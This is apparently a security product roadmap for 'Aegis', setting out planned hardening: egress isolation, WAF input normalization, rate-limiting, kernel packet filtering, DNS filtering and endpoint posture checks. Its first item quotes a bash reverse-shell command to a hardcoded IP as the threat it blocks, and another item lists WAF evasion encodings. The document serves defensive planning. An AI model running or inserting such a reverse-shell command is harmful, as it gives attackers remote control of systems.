# 🛡️ Aegis Technical Roadmap — VPS Pre-Production Hardening & Public Launch

<p align="center">
  <strong>English</strong> | <a href="ROADMAP.fr.md">Français</a>
</p>

This document records the **priority technical locks** identified during the Aegis efficiency audit, the analysis of critical modern threats (memory corruption RCE, kernel network bugs, lateral movement via remote management workstations), and practical enterprise architectures.

The primary objective is to deliver a **sovereign, frugal defense-in-depth architecture**: elevating the neutralization rate against targeted attackers (Red Teams / human pentesters) from **~78% to > 95%**, safeguarding core business servers even if an endpoint workstation is compromised (*the "Assume Breach" paradigm*), and providing fleet-wide posture visibility without recurring per-seat SaaS taxes.

---

## 🧭 Development Priority Matrix

| Lock / Module | Priority | Architecture Domain | Major Security Gain |
| :--- | :--- | :--- | :--- |
| **Lock #1: Strict Egress Network Confinement** | **P0 (Critical)** | Docker / Egress Infrastructure | Neutralizes 98% of hardcoded raw-IP Reverse Shells |
| **Lock #2: Multi-Encoding Normalization** | **P1 (High)** | Ingress WAF (`gate-proxy`) | Blocks WAF bypass vectors (Unicode, Hex, Base64) |
| **Lock #3: Dynamic IP Rate-Limiting & Quarantine** | **P1 (High)** | Ingress WAF (`gate-proxy`) | Stops automated fuzzing and brute-force mutations |
| **Lock #4: Ingress Virtual Patching (PHP2Shell)** | **P1 (High)** | Ingress WAF & Host Agent | Drops HTTP OOM saturation & prevents shell spawning |
| **Lock #5: L3/L4 eBPF/XDP Network Filter (Kernel UAF)** | **P2 (Medium)** | Rust Probe & Host Kernel | Discards crafted TCP SYN packets before Linux kernel |
| **Lock #6: Enterprise DNS Filtering & Shadow IT** | **P2 (Medium)** | Egress Gateway (DHCP / DoH) | Blocks C2 exfiltration & regulates remote access tools |
| **Lock #7: Frugal Rust Endpoint Posture Agent** | **P2 (Medium)** | Cross-Platform Endpoint & SOC | Local CVE inventory (< 10 MB RAM) & conditional access |
| **Lock #8: "Assume Breach" ZTNA Micro-Segmentation** | **P2 (Medium)** | Network Architecture & PEP | Fully isolates core servers from office LAN / laptops |

---

## 🔒 Lock #1: Strict Egress Network Confinement (Anti-Reverse Shell via Raw IP)
- **Status:** ⏳ To be implemented
- **Priority:** Critical (P0 — Required before public VPS exposure)
- **Egress Efficiency Gain:** **+35%** (jumps from 0% to ~98% mitigation on outbound raw TCP connections without DNS resolution)
- **Current Issue:**
  The gateway `apps/egress-gateway/src/index.mjs` intercepts inbound/outbound DNS UDP/TCP queries on port `:5053` and explicit HTTP requests on `/inspect`. However, in `docker-compose.yml`, if an attacker compromises a worker in `aegis_backend` and runs a direct socket call to a hardcoded external IP (e.g., `/bin/sh -i >& /dev/tcp/185.220.101.99/4444`) without invoking DNS, the outbound TCP packet bypasses the gateway via Docker's default bridge routing.
- **Technical Action Plan:**
  1. Define an isolated Docker network `aegis_internal_sandbox` in `docker-compose.yml` with `internal: true` (zero default route to the public Internet).
  2. Attach `aegis_backend` and `aegis_timescaledb` **strictly** to `aegis_internal_sandbox`.
  3. Attach `aegis_gate_proxy` and `aegis_egress_gateway` to both `aegis_internal_sandbox` and the external `aegis_net`.
  4. Force the DNS resolver configuration of `aegis_backend` towards the static IP of `aegis_egress_gateway` (`:5053`).
  5. *(Phase 2 Linux Host / Bare-Metal)*: Attach a `cgroup/connect4` (`sys_enter_connect`) eBPF program at kernel level to drop any outbound socket whose destination IP was not previously validated (60s TTL) by `aegis-egress-gateway`.

---

## 🔒 Lock #2: Multi-Encoding Normalization & Anti-Obfuscation in `gate-proxy`
- **Status:** ⏳ To be implemented
- **Priority:** High (P1)
- **Ingress Efficiency Gain:** **+12% to +15%** against manual WAF evasion techniques
- **Current Issue:**
  The `inspectRequest()` function in `apps/gate-proxy/src/index.mjs` applies a single-pass `decodeURIComponent(req.url)`. An experienced attacker leveraging double URL encoding (`%252e%252e%252f`), interspersed SQL comments (`UN/**/ION SEL/**/ECT`), HTML/Unicode entities, or hex/Base64 payloads can slip past static regular expressions.
- **Technical Action Plan:**
  1. Implement a canonicalization pipeline `canonicalizeInput(raw)` in `apps/gate-proxy/src/index.mjs` executed before rule evaluation:
     - Recursive URL decoding (up to 3 passes as long as `%[0-9a-fA-F]{2}` sequences remain).
     - Null-byte stripping (`%00`, `\0`) and path traversal canonicalization (`/./`, `//`, `\`).
     - Removal of SQL comment evasion sequences (`/*...*/`, `/*!50000...*/`) and whitespace folding.
     - Automated decoding and inspection of suspicious Base64 blocks (> 16 chars) found within query parameters and headers against `ZERODAY_EXPLOIT_REGEX`, `RCE_REGEX`, and `SQLI_REGEX`.

---

## 🔒 Lock #3: Volumetric Rate-Limiting & Dynamic IP Quarantine (Anti-Fuzzing / Brute-Force)
- **Status:** ⏳ To be implemented
- **Priority:** High (P1)
- **Overall Efficiency Gain:** Neutralizes **99%** of automated fuzzing iterations and bypass mutation tools
- **Current Issue:**
  When an IP triggers a `403` or `413` block in `apps/gate-proxy/src/index.mjs`, only the immediate request is dropped. The attacker can rapidly transmit thousands of automated mutations per second from the same origin to discover an unmitigated vector.
- **Technical Action Plan:**
  1. Add an in-memory `ipReputationMap` registry (with periodic TTL eviction) in `apps/gate-proxy/src/index.mjs`:
     - **Automated Jail Threshold**: Whenever an IP accumulates **3 critical triggers** (`risk_score >= 90`) within 5 minutes, it is automatically jailed for **15 minutes** (instant drop in `< 0.1 ms` returning HTTP `429 / 403` before body parsing).
     - **Volumetric Rate Limiting**: Cap each IP at `60 requests / 10 seconds` on dynamic endpoints to stop credential brute-forcing and logical IDOR scraping.
  2. Expose the quarantine table with a manual unban action in the SOC Cockpit (`AegisUnifiedCockpit.vue`) and allow instant reset via `POST /api/v1/dashboard/reset`.

---

## 🔒 Lock #4: Ingress Virtual Patching & Memory Corruption Shield (PHP2Shell CVE-2026-109618 & CVE-2026-109619)
- **Status:** ⏳ To be implemented
- **Priority:** High (P1)
- **Application Ingress Gain:** Neutralizes out-of-memory (OOM) saturation and worker desynchronization exploits before reaching backends
- **Context & Threat Vector:**
  Core PHP vulnerabilities **CVE-2026-109618** (OOM `longjmp` uninitialized state) and **CVE-2026-109619** (Use-After-Free / zombie request state persistence across PHP-FPM workers) grant unauthenticated RCE via crafted HTTP requests (oversized headers, malformed multipart boundaries, allocation flooding).
- **Technical Action Plan:**
  1. **Protocol Hardening in `gate-proxy`**:
     - Strict size limits on HTTP headers (> 8 KB total or > 4 KB individual header dropped with 431).
     - Strict RFC compliance validation for `multipart/form-data` (drop requests with > 3 nested levels or corrupted boundary markers).
     - Hard caps on `Transfer-Encoding: chunked` and compression ratio verification (anti-decompression bombs).
  2. **Shell-Spawn Anomaly Monitoring (Defense-in-Depth)**:
     - Extend the local host sensor to detect unexpected child process creation (`/bin/sh`, `/bin/bash`, `python`) spawned by web runtimes (`php-fpm`, `node`, `nginx`).
  3. **Synergy with Lock #1 (Egress Isolation)**:
     - Even if a memory corruption exploit were to bypass the interpreter, strict egress routing prevents reverse-shell callbacks and environment credential harvesting.

---

## 🔒 Lock #5: L3/L4 eBPF / XDP Network Filter & Host Kernel Sentinel (TCP UAF CVE-2026-98432)
- **Status:** ⏳ In design
- **Priority:** Medium (P2 — Phase 2 Linux Host / Bare-Metal)
- **Infrastructure Efficiency Gain:** Shields the Linux host TCP/IP stack from malicious SYN packets before OS kernel processing
- **Context & Threat Vector:**
  Vulnerability **CVE-2026-98432** (CVSS 9.8) targets the Linux kernel function `tcp_v4_syn_recv_sock()` during IPv4 3-way handshakes with crafted IP options (LSRR/SSRR), causing a low-level Use-After-Free (kernel panic or arbitrary ring-0 compromise).
- **Technical Action Plan:**
  1. **Ingress eBPF / XDP Filter (Rust Module)**:
     - Extend `apps/telemetry-agent` to attach an eBPF `xdp` (eXpress Data Path) program directly at the network interface card (NIC) driver level.
     - Drop instantly (`XDP_DROP` in `< 0.005 ms`) any IPv4 TCP SYN packet carrying obsolete or dangerous IP options (`IPOPT_LSRR`, `IPOPT_SSRR`, `IPOPT_RR`) before the host kernel networking stack handles the packet.
  2. **Kernel Vulnerability Audit in the SOC Cockpit**:
     - Automated probe reading of the host kernel release (`uname -r`).
     - Display a priority remediation alert in the Cockpit if the underlying kernel is identified as vulnerable, including verified distribution patch commands.

---

## 🔒 Lock #6: Centralized Enterprise DNS Filtering & Shadow IT Governance (TeamViewer Family CVE-2026-92372, 92370, 19042)
- **Status:** ⏳ In planning
- **Priority:** Medium (P2)
- **Perimeter Efficiency Gain:** Eliminates C2 callback channels and controls remote desktop tools without heavy, privacy-invasive TLS inspection
- **Context & Enterprise Deployment:**
  Rather than forcing all corporate web traffic through a central gateway (which exhausts bandwidth and destroys frugality), Aegis Egress acts as the **central sovereign enterprise DNS resolver**:
  - In-office: Distributed automatically via DHCP on port `:5053`.
  - Remote / hybrid workers: Configured via secure DNS-over-HTTPS (DoH) or DNS-over-TLS (DoT) profiles on endpoints.
- **Technical Action Plan:**
  1. **Remote Access Tools (RAT) Categorization in `egress-gateway`**:
     - Classify domains and ports for remote administration software (TeamViewer, AnyDesk, RustDesk, LogMeIn, VNC).
     - Enable administrators to declare granular policies: *« Drop all outbound remote desktop traffic from production subnets and database servers »*.
  2. **Lateral Movement & Implant Neutralization**:
     - If an endpoint is compromised via an application flaw (e.g., chat URL injection CVE-2026-19042) attempting to download a second-stage implant (Sliver, Cobalt Strike), `egress-gateway` immediately sinkholes the C2 domain via CoreDNS and local Nimble 9B AI.
     - Core servers behind `gate-proxy` require strict authentication, preventing unauthorized lateral connections from the office LAN.

---

## 🖥️ Lock #7: Frugal Rust Endpoint Posture Agent (< 10 MB RAM) & SOC Cockpit Integration
- **Status:** ⏳ In design
- **Priority:** Medium (P2 — Endpoint & ZTNA Module)
- **Endpoint Efficiency Gain:** Proactive local vulnerability detection across workstations (Windows, macOS, Linux) without per-seat licensing fees or heavy EDR overhead
- **Context & Philosophy:**
  Traditional enterprise EDR solutions (CrowdStrike, SentinelOne) consume 1 to 2 GB of RAM per laptop and cost up to €50/seat/month. Aegis delivers a frugal alternative: a lightweight compiled Rust native binary (< 10 MB RAM, 0% idle CPU) operating as an endpoint posture and integrity probe.
- **Technical Action Plan:**
  1. **Standalone Cross-Platform Rust Binary (`aegis-node-agent`)**:
     - Zero external dependencies background daemon for Linux (systemd), macOS (launchd), and Windows (native service).
     - Strictly verified memory footprint under 10 MB RAM.
  2. **Local Software Inventory & Vulnerability Scanning**:
     - Periodically audits local installed binary versions (e.g., immediate flagging of TeamViewer `< 15.83` vulnerable to `CVE-2026-19042`, outdated browsers, unpatched OpenSSL/sudo).
     - Basic workstation hygiene validation: disk encryption active (BitLocker/FileVault/LUKS), OS firewall enabled, operating system updates verified.
  3. **mTLS Heartbeat & SOC Cockpit Visualization**:
     - Transmits periodic JSON posture reports (every 15 min or on change) via mTLS to the Go backend (`POST /api/v1/endpoints/posture`).
     - **Fleet View in Aegis Cockpit (`apps/web`)**: A dedicated interface listing workstations, health posture scores, and prioritized patch alerts.
  4. **Zero-Trust Conditional Access (Device Posture Check)**:
     - Integration with `aegis-gate-proxy`: If a workstation presents an unpatched critical CVE, Aegis Gate can deny or restrict access to internal business applications until patched.

---

## 🛡️ Lock #8: "Assume Breach" ZTNA Micro-Segmentation & Internal Network Isolation
- **Status:** ⏳ In design
- **Priority:** Medium (P2)
- **Network Isolation Gain:** Completely blocks lateral movement towards critical assets in the event of an endpoint compromise
- **Context & Philosophy:**
  Modern Zero-Trust assumes that an office workstation will inevitably be compromised (phishing, rogue USB, zero-day client flaw). Corporate security must never rely on implicit trust of the local office network.
- **Technical Action Plan:**
  1. **Elimination of Direct L3 Routes to Core Data**:
     - Office workstations and guest Wi-Fi reside in isolated VLANs with zero direct IP connectivity to database servers (PostgreSQL, TimescaleDB, ERP, etc.).
  2. **Single Controlled Ingress Gateway via Aegis Gate (L7 PEP)**:
     - All employee access to internal tools and databases flows strictly through Aegis Gate with mandatory MFA, mTLS authentication, and in-line WAF inspection.
  3. **Internal Network Scanning Detection (Internal Honeypot)**:
     - Embed ARP and port-scan detection within the host agent to raise an instant high-priority alert if a compromised laptop begins probing internal server subnets.

---

## 📊 Continuous Level 1 CTI Cache Enrichment & Threat Intelligence (Phase P2/P3)
- **Status:** ⏳ In progress
- **Priority:** P2
- **Objectives:**
  - Automated startup loading of consolidated active C2 domains and known malicious IPs (Abuse.ch URLhaus / ThreatFox / CERT-FR / CISA KEV feeds) into `apps/egress-gateway/src/index.mjs` (`O(1)` lookup < 0.05 ms, RAM footprint < 5 MB).
  - Continuous threat pattern ingestion for local Nimble 9B SLM training and inference.
